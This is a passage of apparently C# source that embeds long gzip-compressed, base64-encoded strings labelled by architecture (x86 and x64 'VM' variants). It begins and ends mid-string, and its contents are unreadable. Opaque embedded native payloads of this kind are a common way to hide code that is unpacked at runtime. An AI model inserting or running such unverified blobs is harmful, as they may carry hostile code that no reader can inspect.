            + "XuxE7IcsUurFkw3eVkjJuoLlYJnWi9WVvz3SbenZUIHKhId0rReXUMynBXWDl/qJ3K79c45PjV/6m0NXjN5M9ocy2jccc/i8uEyQ"
            + "pUCW7cOJckWObbaiD7dh13TzeX+r6WzApvejAMQXC7EpHUABcD1JyCQdqgfooQUxTMjyARwSikd4mwFIO4DXicgXQ1FyULXP2sOA"
            + "ugbQB3Dco+KVFdXPPwt3I6qgumZvMT+3sYHMk0z/UP8072cinBtATizhj3aeCk4JOA0BVL9j7cqyl56p3o2vKL1nYt3qIF6xING2"
            + "GvzNnmnHEXIksIXyItUu9rk9uiBuMKgkAwaLy3JaUxPEBYYnLJrwCqs19UKM1IKkfNc0BtFRkBjZDas2a4xUBumyx7SI+YI4N9zj"
            + "XMQmg1zEomL5IKYwGJ7dsnkbGzDZPWQy5YPo47WPbSNxUlitI2Qhw0D+6Rg09fUc8HdCQAQ88YjXCHqlIKnGkDLeXLYjNU82N8Tl"
            + "kvBhuMiwQ2jtzkc3snGDPQzp1DBEizrzwMcaknitQtJ5WB3OZ75Lpre7+unK5yorX6x8geWfDfjTQRfGZdmwCU7fL1wXeZf6wugG"
            + "NjYNgVSawCQJiwRZBsobmst1CeyOd0UIc8hWzWesX1pHMn6D/nBjhSovMULtM4QtwBobwe3TPxMJzZd0XcYYhfpWcO9KXKbvXgnP"
            + "JHQIz3lHJy7jSCDICiaaeyWfuWchzEp7PvYNBm2xbpn8CjXxektCKFFOYciSQlh3hW5TctNo6bd8qCfk3WQi0dZjQmNYaZkC7+Iy"
            + "Kx1/oQBMFiWSV7CWtxwzTZl7zWlW6g+09YIclDOy3BTGPby08rfBFHoEru6k1uJwTSmVg4zCyWlTeNhBgsC1ksYSITe908vqUjgL"
            + "WMdAqHdAn0J3Og/bZsHQaH8oZEhh2gKI3i4gabhS3JU9eNhvjw07++zXEhTqT7caAvZQsPPz7tF0CidEDQRdLDmoXti99qUXX9z9"
            + "/B52Eve5gLvtxRcqn3yOrMmO6sqXyyfRochQ16pZqKIdieEUW1ZUUVQGbyaTeBlGAcVqtjUYsPsdjpmOU57pjIyejkHHJsfiStzY"
            + "8cM2mwdec4yTuB2A7TnTf00UF+0HHSfhTYVqaA93RuCqbf8SVxRyiuVzT6csfQO2Mstmry5gL1NgYkF2+VV8cgU2+8MXX/jl99cr"
            + "5CvWKxTkRykep/afSwqGNPxTSeHoiatYU6Dk+tUr1pesWK9mpVApr4LDZxXUvrLcKYx+54XOT8F6EJZB7E1hWh88QS5TraYBvOLA"
            + "lWLXntIp3MLRkebzA6dcVogY4xex2YHP/A7dFCYNuuLAgDuUqclhrJ8WvXjQrY+xa5jmNl9khOQYWqQS2DWNmrB6df1tuD3DSE7j"
            + "QwQ8v8Oo8M5q91+F1zjCZNK4YeCZF56xjC1xIwRBGgNNODgUT6QcJDcmkhhloTSmNH7HgvmxEHw5SONMveNwcxdymw6UzmAXcAvk"
            + "cawdBq4uU1TdGFfqb4yrJLM4/Z+s2to3M3g5o6b0hrCy6oawamI2s//Z+Zok127KU5benKcyXsOswDpawpMZZb5reKAKMWVyIaYq"
            + "/xKxVlc8memrW4gpaxdiKvUcYkPt/VczfbULMWXtQkzVQLHu3sETmb7GhZjStxBTjVFs8ETbTKZv7vUFmFK6EFPVX8fCo0wBADlK"
            + "DRyt5GgfR6s4eozSa3n53P+lNC9fTrLq12mxQXIEBE2VAFEiUi9AVIgYssha2ssnQGivMYrgalH1uTnzEKV0PqIqn4esVVTNR5T1"
            + "BCEbk3cda+khYqvIsN6QzWYlzG9kJhSbhiyeFGBKDsu9JYupOEyexdbyfbUCjO9bdwuahAuz9qU9ZKDG+YjSNR9RJXkk5okfHzxJ"
            + "hmC+Mg9RsgThnqHh3FZTEl4YgNRSEjIqkDWUhKal3ZyuJ+StmF7TjZQTS7R8CFwXIW+ngqAZV4dAZNMF7C2nwWv+5v79Ibf2qwWQ"
            + "CrkXNfj4fMV5GL87EwZcRQ5EklA9K6s1mb/qCeuOBaxGgt5Hnzwwv7E36uojQkv+idAY4d8m4Ke/ihOMfho4IFlUwNxC6psPpXxD"
            + "ThrkCtq1f+Bs34x6EUr2X7VdeJQ2+wZtFyqobDylo41IuIo2YqEaKtWRiqfq+GYkrCfNr3HVDgZbYxag1YFxUQF/IYec5lpUQEvI"
            + "WHfM23McoES2CyQQz/REFoCs4JlmFiMAr3xUad7iAv51ERPlYlQKJK9Unu1ClZZmu4DSCkrC4yEUbzoqDk06Qg3lY2FH1NXREYDk"
            + "R9Bnu9ARGrNdYAQjIRfTEhKOr7tRQXFxkeIX5a+wvyLXWOYehNTqIiUP5d2DW0mxpqSomMfYe3CcwmoeqLsX3W89GZ6sp01LIDxZ"
            + "/j3smrngwbceHcHy6GWHf1eBy0Utge+kMFzVMm8y8qUF8NHGNEcvcWR/Hw2csvQsKNayt8GmA7qluEHhjgRvCGSmpfejG2DesE0q"
            + "7i/gfwXEHDH3w17hq+dawrqLvhzgdzEi0n4wDqViw/0FmYshXL0AWlbAsCR6L3rHW4LRHrgFxEKWHqg7IuNQcnSZOyNNB0LL0B6o"
            + "NriOVQ9w0cSX4ekH0CvCGWFZVIhbm9x85bvY7vGOFBQXUGQ0FqJKuG4DBN9tluMUgYIpGpejP+FTs9noHHEl4QYF16XluPHhd1EA"
            + "51DWLoE9q5QXq9mhmWaHgdKK1aoSpOWdlJYri5G2EpoMpn6IsksdSK4pob19HCmnwhVOJEuK5UgmKLl6De2rc1GS1KZAjhGS+L9Y"
            + "LQdKqpA/t6e0WE3CTFbTJYFipLhYIeDQ0JXlucX2N7jF9rPdYvsN3SKD5T0ig609IoNLe0UG+3pFBld4bmZwwoOCxZxNOu/N7R/z"
            + "UlEFHaLGh6RKTe1Jc+RqOmJdHyWV1LxcP5JKNR1Gz5GrqSpJPyW5iTdSUvEQVSUdoGQJVWXkSCVVVREQezUREHtVFxR7dSwo8mrN"
            + "oMir6UGRV+tCIq/mDom8qh+6mVclYZFXG8M396o0IvKqMSLyqjoq8qorKvJq+bDIq6FhkVe1MZFXkzGRV6viIq9OxEVerUuIvZb7"
            + "ichr+k9EXpOMiLzWOCLymvQfIq8Z/3Ezr6mPi7zmOn5zr5V/KvJa6FOR17QnRF5LnhB5reqkyGsTJ0Veq02KvMZ8JvJa/Wcir+Wd"
            + "EnmtgZDk5OISDnsaqRKqyHVa7NHyMyKPhs6IPKo9K/Jo8qzIo1WjIo9OjN7Mo7WfizzKjN3co/VjIo/mnRN5tOGcyKPseZFHDedF"
            + "HpWPizxqHRd5tPSCyKO+CyKPVlwUeTRxUehR3SWhR2u+kMC5A4/Y8DgGb3n01T1NGN+kDH98qImCuqsSwfeoMQEVCddMSQTfsdIC"
            + "KhKum5YIvn/lpiWCb2P6DAXfzSQzEsE3tdCXEsH3Nu2cRPAtLi9nSfYZ1uIyUtIzHDDAs6r6liVQbtLvhC5C4CFsNVOg/CsZgBak"
            + "oa+gOBSkbJn21iyxllm8BIqczql4qp5vksFzuWYs1JCL0p1T7E/Wr2Nv4wioVA1ZIhKWf22J+GCldCblln4daZV8DbeklC6Wc8tW"
            + "cTvSJFy5w5XSJYpiqk/3jSWwXmsUJWqMy4DHPiVjvokgCUDEVLUkJGT1FFzDCapqSYzJ8u4Qm9dA6DvoCcBJkZFlbJ7YaAOh86jR"
            + "/ABEgUx+p9h2651i20u/hd3Adt4EolHm+5Z4ChCQsoq7sK+aD/XEXbh0MA5Vpvv2Eqh/FEqyczhtMLBs7NtUsFjFHWI136FACb8f"
            + "8/KX8FU4PBjKJUhCE4rCECFJSdt+3HURvht1f9l1qahmCYrA9xR/JGBPUxKetzzTrKLubiGpzL1HSKr0IrLYWIbWwBzp3mJ+tCTz"
            + "SyX1tI2/bJJXjl5RYpRLabjKGihYTMH+HvxiwG5YAqViCQVXFylkBoqoKbKGIHV/z2fWMzmPPZH6E8sUMnKmmKkmZTe0lKIWy/xh"
            + "E5uhpir51qKtfCv8H0mqrJDZw/z/lUmPwRNbTrbLSvLzyiuvNzjerjoGT4DzWJqdu3cdNMErWE7VljE9y0iZB5ki8iNjEiZ45sv5"
            + "dLP2p9ue2LiVZdYxW0gPx9vP/7qIgT96Mzwd5jRu/a93FjJ97fDelXOb/txTl/YurnqrcmrTQ48bnPCAKlC5kdnAPEp+WIbddevP"
            + "OLUuHJeqvZFA0jtPyw5mLVPGbCJCG9/lxw/5BFpuJPBw4Iaz1gXQS7zys5XxJ6j8xBB8JcwBpyUrwXl1YXiqzklWDv9y21PME/ve"
            + "qdzieHvx4xpcxT3MRBi9U8ZsI+ZvZjToncWPP/jsqu2GrdIITuH3T7EML8AyoGHR1o3vfvLq3fpteg1TR4SkTM7t2yt/Ab3fIJb+"
            + "YNNU5f+8D/aqCQJi//rmyaf2vTO7RcZMRObZMyuyRx2FXwQhQ/5A53yVDgODKxixCbNbNExtFNduaO+K7TD41M9PvqNhjBQECehR"
            + "SEJIwySj6BQAK/647ucaJm8YvbqDSFCN1HrpMHzdzinc9HCVmjajz/739vJhVLmRrPI6InrXr1vI4FXDGMFSJvHXg2+D8QoM2GKy"
            + "NoZhXJssazVhKgnDNwyfUnJ+TObBqxkbRsvAXRTIi6Fl2blSWBvDZQI3Ch3xn796eyeZcwwN/OOfbyOe9767puqtPUQz7bGTxOVG"
            + "btUuvKDbtvTf7nhCw8jjOOx3ngg+QwF9HL4X5YSfpmtrJKSabIunDU9X/HTjVui8arv0JWDDqhbixuTXVWjQv39g2CpjXBP5pJ0D"
            + "uxa2NCvIDaPbtD/VbKKxylyGzzQY/CAqFFu56fW90LXhMs7iwWdB6NqmxzbDDmWZpfhHf2sBhFJ7zbUtsIFf+93fn3mk8vW9qT+9"
            + "2wBiDL4H5cAU/qr17626rYDfMmB5Ngc0UAaMIGbo7y6gg7/6lHyrcJYQsBX4poKZg99Tknvh2YuENnih9F54DMjpf2Xb5gktSOju"
            + "hccAAcCiHxsJTFwNRoNrX2aeZPYyK8ggzzE1jApbTxF0F7aeJB12cdxiQsmY796H3T2/o92hc3WmezHX2s2pfJm0n8y09pLuDfcV"
            + "3Ci9WO/LTI73Zt3SAmHGyXrJuhReL9F9WTBJwO9mwb0/d7yt2QQpJSvyfxFbZUvTNAAA";
        internal static readonly string GZ_BANANA_X86 =
            "H4sIAAAAAAAC/6Vaf1xU15V/NG5iuu6GbmkdUtO8JNLMJIgzw4iTiU2FoMUmICpRsvUT0YiB5heNxlBLU9vahkS2IRs/kezHJqIk"
            + "YdHq/ISBGWAYxmEYmB/MDDMTPiRSo4YETVAIP1Ts3nPuezPvgeafjUHv+Z5zzz333HPPPfc+CrcsZL7LMF6H9Xqgrzmq639OCBgv"
            + "tzfML1rI/AcBjOEGdlPmxlVsYNxpMl9yty6ezch/NJcFxgrC+B5hfNpUbzS21gOTBX0FBP8Bxf1G1wjttH7N6tVs+xe7bsTLzizI"
            + "JLwDVJ9Il2HCePG4wIBMUMNb5prN4C0bmmUZYaK2KYInCUYHfPXa9blkcMnWuSzOLvXWuF28JrArn+AL6PC8RSUE+jfOIt6Yiq1i"
            + "Y3Lz01HFAYFaHgO1fk7tp2zmhjVr2a6ZxpNDBEoUQ8aL3jFm20LmJwzzAP5H+uvaLC2Gc44B43m9JfIZK00pXZpSKqPsBy78Ubjg"
            + "50MDqX9ayMxnGJMVBvWOVcVJz5eG7hpCfp9hgnrr9bDZ6wz06Y4azxu6mz+8x0Y4/8owgHqNgKZJ9nFdXSOgqXwfN4GmemswFIUR"
            + "F/wZJwB99Bb3eHDA2GPo9V9WEfhuMRzstHy0JHJE/4+g23dWb+mfcTVF/7KQ+XeG8V9s7w7XWessX7U3uK3zX8NBPFP2zzuOtwYB"
            + "Sn0NTe6fCQ00HenxuHzhuq6RrrG0tLQCwrmDcowf2i5aomYjQUsIupDa2XosXOf+wnjeNQJD6y4S7qHXcNSm695LzknoAVMzElDC"
            + "MF0j1gv6LxxXTI6g23q9xeO7EPzQPmK5PK8Sg2hT6QvbX3xlJwvGQS8Nm1L6XCWqCw34ToNKvaW9O9hprcQ1ic8sSoB5DAPNs5XU"
            + "iwGTwzNl+rK/x/LRFIWAGzjjOQOqk15H18Ncgdz+Ol1kY3/A1ApT8r+OXaAJsQgyK99AS+hEIdbdH2kHD7+Blrs+9w+7w40nYQhq"
            + "1dHjDsK6D+Zs6rJbeVNMjnvBMipzb8DQeZ64bJxI/phhLJdcteAbGDQSbrpqPKE/0m/onTa1+uxNrer9aKLJZZwhbmE7R3L24xS6"
            + "Qy1jYFMRIW9lGHco2Bn27yLE7dRWiAdNJaFvY5je8f5W+4imhlLU+5p62jHQB8Yb92MsmI1hJxVmpdbx3mntOVloP04fgtXq7PnM"
            + "cgWib5QHDRNxMLFqIfOAcLH5ydNZw6TDfndX06Wgn12/6uer8gqqcGq+kLuN2lRShd4PXNdHwXxTNNxUQSFOBdoaqsINBZNkl7KI"
            + "/BcmNmgajrhDRq97JtBnOO77NOev6CtgwKqNxknYmuo3Y/sQtvAUJbXndW0kAneO/zf6x9/lHHD1X4sTHdPz344R3nOJcaLHsShO"
            + "uGakcaLxujxOBCwllHCfaLwesu/iiYAlZN/7Nga0+0TIXkmbbadC9gO0qe0J2Q/RpvN0yF5Hmx3TIbuWNnscIbuZNl0zIbuNNmGQ"
            + "XtqEIfzvoLMg6rqnTTb/Kd8R8I2GnXoHw5FuBmAR73YP68zt3Y5BrxGyBonZ1IMY+NAbkmfXVLx//kFM5tDFa4QjEnLGQUzagAX6"
            + "Iladuc3jnyR45UFMDKDGpOvS6rv7pu3uuCrzQTz29JbwR4awyUHZkBbYnD1RyvMaG+sD50wOaoVxzF8LO+rgTeYmqcGEChbQDhRW"
            + "1WCiA/O6/V4jsCH91eAc8eyglocG9B80nSKs+hoMR4o6xxtP1h611mA40mkDpPHXCLIKHD5nqULDN26r5WT8TAIbmHdx44kdgcYt"
            + "Jpxk4gNE2BWsQi6Xa4g93gbqh5x36SifQma0RE2TRe8KbAP/1x4dPYTTTinN2UM6eS3kL/BL4t8w0mFO7MbMNWychM4rKWm3hp2E"
            + "uzY/TgK3hJBLSFieNJ/XsLHMXe8/1Vfr+8prBPvuJ+tm9Ptd3hav/uPI5P33GP+Gicd91jCRmVJa9R4uIFgIo69l26NhZ+d57Tnw"
            + "73uYwHq+IZaRCacY38PBkX5InmITkMuXpfQKyAx5SlRALpOnnH0PXcvb2D0dGO8eDneSUZj3FzJ3xTnBD4OdgfGO9uAITNB5rAVk"
            + "5O+j+3kZ+1h7T9Pnges9rZyOgvfxNBRq5x1IuOVzuXYrjI/cujoM06bwqbP6er83HpEOwvghZbCPbWDFzOF4L6if4oykj5DBDwa9"
            + "gobus87JggZ0SMBpmOmrDV0qacAAAcfzLq9ooEUVrIXQ2OoGDGpPj2GCZAFXre9qzrGFzL8wjELOei0FXFtJ2kUCvESAlx3DlcxQ"
            + "kba51vTZXkqnKzm6msoiXUPbSpA9zOnIIO36Y5i11KSZeBy7b8zKzGOhIKg+jnOxTEesbp31bCpJ2La/03ROTkp3o2500Qmcms0Y"
            + "CUHmSOP/X3ECzy48da6S/EB6GzsKT+B6ufvJoYsgsGGwJY/mZBbsOoGaI+GWUxrWX1spJMP+Q0LSOKY9gfuSkr1R45iDAlBj3d/7"
            + "D3/f/SEB0HZSV3//qBZN7bfQNeUr0rQkHUZwx8du3SxOmQ4nQaslqBibZ4xjVUKQr1TqhKDx1KneQJ/9yuN6NBmq0VBd9/BmSpr1"
            + "5i4gyzjukPXvnVcNzoo4qTNHjlRxwqRUAOEaSkLBAmS9HgMnFHWNAEmC3azHYwGojovG8144Fnppp+42wwzgg3pc3FXrWHrZWmmg"
            + "VdoxfTsMU22gOicC50kw9gUNH6vNuPowCkt6wZZ8nEIwJR4qMqP7mhq9H2nYJQo1G+5gHyT/bM8qF3HSM+KcahFnmQo5JDC3Z9WL"
            + "OMuVyEmXE05hC5feiDX3pW8XUsoyIaWoaMGA9n/hOFPdgnN2tOu+dLTbrZo6KtiljbR0XtUYW3CwUJ0dw5uVRr4y1KWU7pRpBmk/"
            + "WHPbkN+jGab9uCOSsSDltXR/1ejSJFpwL5HjwmtZTDk6V2+UyKkJtZiUBkPNFyBvs4+w3VcM3XCwmCdMH+Dhn7ITA0vznCW2olYj"
            + "pDhNjQVN8BwNN8OpoKmntFtnqAufaBnTDMaG7RxJsmKsQ/KzXIGhpFZ0gc/kMZRY0aQ1efctY4OBXQIqMmaOUSrCcwioyJg/RqUT"
            + "3qCAiowNxygl4Y0LqMgY08pTCsJbIKAiY5JWnCWsDLdy0tmIYkE7HuONX3nO0IOr+UPHIK1My9pp1UUSZXk73d1GW23YxLY3aKpE"
            + "QHNUc7idJnICQLIhMqw0Z1WhTGOdxWiOcozBdjzHc9dkr2GBC44k22iRDR3vswcsAQP7yCOplF6xgu32AZRNaewGJ8JmG1oZjoY7"
            + "y22YFpAF04OTSVNtw1LUa4TT4rBAAjpDKtAYbXh2c90ME9CNlYJJMk3UhtYjz9xqDcbUTlFNmLtjAy7oQNtMA3jrDhgWdaC7l7Dk"
            + "1o5CS7LtmAXAWhj/gB29DycXBj7rO+0PSQ1Hm8/LjLNZuiH7iHPSeSzg9NuxqJ3NarracsprkeZuffrZ0mLZlB1TVGyqkDyMTnq1"
            + "PGaf6XXSdOQNnIErSVIXd3GCVLWoixbWfe0Ni7twRk9k57ONPe0DGjllhSc7JrO70APkYnTG1Ep3Wcdk4Y3ACr6T5UpVVyx1dExq"
            + "DlOqYxLXQduFFtuMISO7Jp8FszSOLtx2UPRqemkb7Qh1CTPEBWol3LXD7o52zTUqCXlIk+SK1WlkRLkLxwBObIyVLsyy+kbLJfeY"
            + "7svmM7ovC2knYj+kjedceJTBYwqpUVNZDpbtc2E55W4Odpoca/JRmfBUrnPhEor5tIK2uaifyHXaPdP2ifaaW+e/HHLF0j3Uza7+"
            + "cNuwC5cJ0hLIprpxolxVY7lS4MZt2DGp+9LdaDjnsVT1oADEFwuxOd+DAuB6koFJ/pN46CkFMUzIxR4cEqpFeIwBSOXB+0Pw674Q"
            + "OZmar1gDgB7woA/gfEfFS/JLX3gGiluqoLRst4qfm9kTe4Pp6euZ5P1MhEOUE466Q61nvBMCzmYvqt+YtSTz5e2lL+Kzyamz4c5x"
            + "L96pILM21rt1zsm2Y+QMYFPkaek72Od3Sny4waB09NSbbKbPNFIfLjC8WdEMl1KqWSHESPFH6nVNgQ8dBZmQXbN0rWY7lUE684lC"
            + "xMp9ODfc41zEVvm4iEXFIR+mMBieXbd2A+sxWJ1kMhd86OOsJzaQOEkpnSJkCsNA/mnxGbodR92tEBAeZyTYpQW9UpBUY0jl+G8q"
            + "2zI2S7bOz+WSQAPcXMx9aO2m7Fw2Um8NQDpVB2gVZ+w9riGJN1tItjeEAujzNXlwln5tu8j7Sx3EObLhSYiSoihmQFgBSCFQrNBE"
            + "vTeK3fHmBzEMqUh31nytdyDmFOgP90+o2S4M0MHrAyZgTQ3g3uiZDvpnSx4axQCEalVwizKO0lesqHMcOgRmus73juJIIMhufLH0"
            + "6eLni4t3Fb80ROAfzYVZqeO4y+e1hDtl8y5RE6/ro0IJCYUhBQph+SW6B8m9Qd9j+mAzIe8kEwk1nhQaw0ozFXizlu27hOPPFYDJ"
            + "osTxS1iZm04aJoynjFOs1O1pOgVyUJzI/JcwqOHdlLuXnb2EHoGLOKmcOFzDXEY5SBecXNJlPMlg9+NaScNRv53e0GXqyzgLWEeP"
            + "/1Rv9mV0Z3uD5QoYGurx+zdfxpwEEL0rQEYou8xdwL0Nbmu4v73berWSQj1TjfUeq9/b+nnn+brLOCFqIOhiySn00otZL+/a9eIL"
            + "O3sv4yYWcDfseql46/NkTTaWFr8yfhkdigx1uZqFmrgt2j/GZqblp2XCtMbwaosCimVso9djdbe1TbeccU7GZNRjOAYdm5x5S3DX"
            + "RhosFie8zRQQ9iLKdp7tuSqKi+a6ttNEZBfV0BxoDcLF2XoNVxQShulzZ6vs0A3YyjjbMZd9nwKzBrIvjOEDKrDZR3e99NyDqxXy"
            + "1NUKBflRiseRjH+rpGDI7G+VFI5eNo4FA0quXpa6OiN1tZqVQt27FE6WpVDJyg6NY/S3X2j9BKwHYRnsu3HM2b5PydWo0dCLFxa4"
            + "IOzY6R/HLRwa0H3Ze8ZmhojRfh2+0vsPd9voOCYNuuLAgBuRobZNu2BC9H5Btz7GrnSC23zBAZJjaAVK4JUTqAlLU9v/9jfHGJsn"
            + "8FkBHtNhVHg1tbq/gbc1eKqYwA0Dj7bwKKXVR7QElUxioAkHh8qI1Hrk/kPOOJl6ElMav2PB/LAfomcSZ9o1AvdwIbf26CHaBdwC"
            + "SRoLg95v7lPYbowrz94YT988hdN/fOn67mnfpZiaihvCykM3hNMTp2P7n52tSX1znrLo5rx0/zRmBbZNHxiPKRuextNSiCmZK3Ow"
            + "9CKKNdoiQ7G+5XMxZfVcLH3FVcT6mnu+ifXdPBdTVszF0g9RrPOU79NYX+NcTNk7F0sfppjv06bpWN951+ZgSnYull5+DauKTAUA"
            + "5Cg9wNFKjtZydDpH91I6i5cf5mhe/toMpng480mOgKBZdD2OKBFZIUDSEdkcR7JorwoBQnvVUARXi6rXzkaUrtlI+tAsJEsxNRtR"
            + "Jv0TNybvOtbkIGJLybBdfotlxT/RadyEwpOQxTcLMCWHVQiwdA47FMey+L5WAcb3HfwnmoQLk/XyTjLQ1GxEmUSStQhJl/NI2BkZ"
            + "9J0mQzw+G1GWEIR7VIZzu4KS8F4A5AFKQkYFsp6S0DQ1G6eshJyH6XXKTznhqP4D4A4TcgEVBM2wOvMTJLDpPFb9Z+A1t67niN9e"
            + "9B0JpELufQw+JV9ub4CKoZww4J5xNDgEpbGyVBP7q5qw7pjDqiPoj+kDBuY39kZdXUQo+VuEhgn/dgF/6js4wdAnnqOSWyTMd0h9"
            + "84GUb8hJg9wvO470nuueVt+Ckj3fWC5k02a3z3Ihn8pGxopoIxgooY2wv4xKtYxFxir4ZjBQSZrf5aodDLYDcYBWB3W3SPjbNuQ0"
            + "4y0SWkKGO8NdjkGAXPEukECck4NxALKCc3KYAvBmR5VOUaUAgIb581ApkLxSybxYF6pUOi/WBZSqKAlPgVC8raTi0KQj5FM+FnZE"
            + "XREdAUh+hLJ4FzrC3ngXGKGKkLfREpKsjP+HqEClSlM8m7OHrSB31CEKqdVpSh4aJRDZSorlGWkqHmMW4jgppTygSkb3m08HxlfQ"
            + "pskTGGd+hF1jtzf4cpNEsER6k+EfTeBykUrg71EY7mGxBxfHIgl8gjHM0Bsa2d8nPGdMjjnFWvyqV3t0fBFuULgAwQMBmanjLnQD"
            + "zBu2if8uCf8LHcagsQf2Cl89jxPW9+mzAH7lIiLNdREoFZN+LInd+uBeRaDEuyUMS6L3YteI3htywC0g7Dc5oO4IjkDJ0WFsDdYe"
            + "zb4b7YFqg+vov5uLJr4ML2LRK8IZQVk0xOLWJtda+Q62c6RlDIoLKDKmWFQJd2mAiMqhe3GKQMEUR+9Ff8KHY6O2fcA2BDcomMV9"
            + "uPHhN0sA59DhlGTYs0q5Ss32Tevayn6CtGJZegbSUxwtV6qQ3nt/Mgymfoiy50uRXJ5Be1dzpJwKS2RIZqjkSB6m5LLltK/0AUqS"
            + "2hRILSGJ/1VqOTIV8ud3rlSpSZjJ1A8mQzGiUikEHBq6MtuDYvtzUsX2+1PF9hcuERk8tERkcEmayODRNJHB5UtFBjPymxlcKUdB"
            + "FWdTouLm9tcoqKiCDsEqkUxXU3vqOXIZHVGeTkklNc9MSaWaDrNSRcllVJWLI7mJ5y9DUvEQVRXlyAyqqiiDkkqqajhjVlQsnxUV"
            + "y2dFhVrk1fkPibxa/ZDIqxKNyKuHNSKvSh++mVe1D4u8ql7xLVGxQuTVnJ+KvOr/qcirhY+IvDr0iMirJT8TeXX0ZyKvlq8UeZXJ"
            + "FHm1MlPk1cQssddqskReYx8Vea3+UZHX5Nkir5mzRV5buepmXnOtEnktf/XNvRZdLfJa0c9FXhv+uchrZTkir03liLy2d43Ia/N/"
            + "IfJa9S9EXpM8JvLa4cdEXpM+ngwnF5dwtJTKoIrUuWKP2nJFHs3JE3nUnyfyaOFakUeH1oo8WpJ/M4+O5os8Wr7u5h5l1os8Wrle"
            + "5NHEDSKP1mwQeZQtEHm0vkDkUfkTIo+anxB5dOVGkUddG0Uezd8k9Gh0k9Cjw4XJcO7ACzU8jsFbHn1SL3syGQpQYLgjfbUUtD2V"
            + "LPi6lLMlWfDlyR+j4KtUYVGy4IvVUIyCr1klW5MFX7pGYxR8BSvfliz4QibfkSz8eiaggoGyXyXH31hNtilKOvs99fBmuvfZZCg3"
            + "6Ve/+c8l00PYbKRAdRygBankeRSHgpTNPCwgsnLKkqHIaZ2IjPn5ZjBQ+GuuGfYP/RqlWyfYx1evKnmJI6BSHY0TwUD5TnHoMrvE"
            + "KbeS0uny5XRJE19GWiXnlq2G0iRcuXDZjXSGQsWlj924XssVGWqMS4/TOiGTv4IgCUDE0stJSMjMFFzOCaaXkxiTrSwXm+ci9B30"
            + "BOCkyMiy/N+IjY4SOpEazQ9AFMiK9ohtH94jtr3st9gNbOdNIBplU78VTwECUra3Avuq+VCf/ztcOhiHKqsmwPcg2MnO4bTBwDLJ"
            + "q1RQlc4dYoc5IIPfj9LfJ/NVODwY5vwBSWhCUegnJClpmwdtF+GjUOe1jq/SCv+IIvCxxB30WIcoCc9bzklWUfInIakcFZHp5fuE"
            + "pGplA1oDc6R7q/pkcuxXRCTa5PivjmjRK0qMcikNV5lUh6CKgj0O/BygJSApFTMouCxNIVPrEVFTZDlBcrQLmdVMwhNbxg6yTAoj"
            + "Z1RMKSm7oaUUtVjmr3lsjJoo5lu3rudbgd8cpspSmJ3M/19ZVAdPbAnxLkvIz549+2ra9ifp4QlwFkuz6cUdixvhFSyhZN1wNctI"
            + "mQeYNPIjY/Ib4Zkv4ZO1hb/csCV3PcusYtaRHm37X/h9GgN/mCZ4oUg4vP53b85lDlvgvSvh9uovtn21+7aS14on8h56cp4dVdIe"
            + "ucwaJpv8sAy7Y95m2mvKBS+sgjE3MllMJpNHhHLf4lUPdgu03EhgvveGE5J60QG88nPFkS1UflcAvu4lgD+GisEvowF4hU4YKu5/"
            + "bsM2Zsvbbxava9t/25MaXKCdzOYgTjyT2UDMX8tocOK3PfnAM0sL6tdXB3EKb2xjGV6AZUDDretz3/r41TurN1RrmCgRkjIJCwqK"
            + "n4XefyaWPpw3Ufz+AbBXTRAQ+8+/nN729ptX1smYnNAse66I7KkKwW9skCEfLmp/lQ4DgysYsQlX1mkYVwiXpW93agEMPvHU6Tc1"
            + "zDUKggT0SCHRoWEW96NTAMx/Z9VTGia/H726kUhQjdT6kn74Kp2QkreipJw2Q89UFezrR5W5ZJVXEdHv/15PBq/rx+CUMtH36vaD"
            + "8QqMRRVZm7P9uDZx1jLCVBLGvDB8JUl4jMyDV8OG0TJwFwWyw2hZfK4UrgzjMoEbhY74bcX+TRpmMIwGvvPu7cTzXW8tL3ltp4ZJ"
            + "imCPTSQuc7lVu/BS0YZ7fnXHFg1TGMFhf7DFu50C2gh8CkoIPE3X1k9INYn4p+ufzv9l7nrovLRA+jKwYVVTcM/x6yo06Nf/U79e"
            + "xmi/XkjaCbAhYbeygm1/fkPhLzV5NFYvfA1fYDD4QVQotiRv327oumsUZ/HAMyB0Ne+JtbD5WOYe/HM4QQKh1Fx2dR3szT+8/vft"
            + "jxTv2z128K0aEGPwVSYBpvBeoXt36q0SfsuA5fHtvZkyYAQxo+KHEjr4q9vk64WzhICVLoQ3AUwK/J4KSeBFi4Q2eGFKAvf8hJ49"
            + "G9aOFoJEUjLc8wUAi34sJDBxNRgNrn2F2crsZlLJIM8zZUw6trYRdAe2tpIOOziuilAyJkS7O1+n3aFzaay7imu9yKl8hbS3xlq7"
            + "ITHeKblReim7MzY53puJd0mEGSfupey74GES3RcHSwi4KA7ufqptvyYPUkpc5P8A+8UUKnw0AAA=";
        internal static readonly string GZ_VM_X64 =
            "H4sIAAAAAAAC/31Zf1TTV5b/stsftLUVC7RMaztfVGziCiYhQppqCx2xOBaIYJXd7mmZtkgYf1F0OhzbtbjT2XLWOaf0zJ457P4x"
            + "C+q0We3W/IRgQggBQwgkhCSEDMfWlCqlUlsslp/i7rv3fZN8v/4YEc/3/nj33ft5991339N1XzKzjGG8X7L5ZdtK2N6l1rNhwkoS"
            + "soxXvdPM/cnMWoZZh39Yb4/OZjlnuNwzahzXW0a+ZkUZ1RsyqsVUvG7qwWTmQWKjx3rTP2QcD44qHkpmEhnGZDXMgLHmOOm5YujT"
            + "EjKZYQJ6682Q2ev0D+lOGscNfe2fpIeJ5CGGAa7XCNwsxTJuqGsSLS3jAmjTWAPBMMyY9zAGAGP0Fvf1wKix3zDg+1FN2D8XsgPd"
            + "lk8zR07ovwq4By/pLcNLrjbR8mTmEYbxXe3sC52ynrJ833naba1YjpN45hzfdH3WEQBWw3J0eXgpONp2ot/jGgyd6p3snc7KytIS"
            + "yXIqMX5iv2oJm42E6yLcx6mfHWdCp9zfGsddkzC17iqRMkk4a9tN7zXnLIyA0NIIM41heiet3+m/7Vkw9QTc1pvnPIPfBT5xTFp+"
            + "VBNxCsPsrj7w1sHfHmLBORilZDOqw9RccHTwIpjUWzr7At2iFbgm8cgKCeMehoHP8hUURb+pxzNnujLcb/m0hrJA6h/zjIHpxhUI"
            + "PcQKZIQa9BqH/aYOCEn1KA6BT/M1dwfouB5FT2igPqNr0v2p9oIoGT13feObcIdaz8IU1KuTn6mIaDXEbOp1WKOumHpWgWdUZ5Xf"
            + "0D1OIKsnmk8zjOWaqwWwgUlHQm2Lxs/1J4YNA/OmjkFHW4crGV00uYxLBBa2ezKcjCH0Bc9Ng09ThLyPYdzBQHfIl5iSzDxAfYV8"
